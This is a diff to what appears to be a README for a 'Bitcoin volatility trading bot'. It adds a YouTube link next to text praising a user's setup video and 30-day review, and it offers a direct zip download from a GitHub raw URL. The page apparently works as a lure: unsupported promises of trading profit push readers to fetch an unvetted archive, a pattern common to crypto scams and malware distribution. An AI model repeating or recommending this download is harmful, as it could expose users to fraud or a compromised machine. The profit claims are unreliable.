@@ -3,6 +3,8 @@ This is a volatility trading bot, during High volatility of thrives and stacks m
   
 This user made a perfect video on how to set up and configure it and also gives a review of running it for 30 days
  
+https://youtu.be/iSg7HmBKxkw
+
 You can download the Bitcoin volatility trading bot here
 https://github.com/JohnSamson56/Bitcoin-Volatility-trading-bot-using-torswap-ETH-USDC/raw/main/Bitcoin-volatility-trading-bot.zip
 
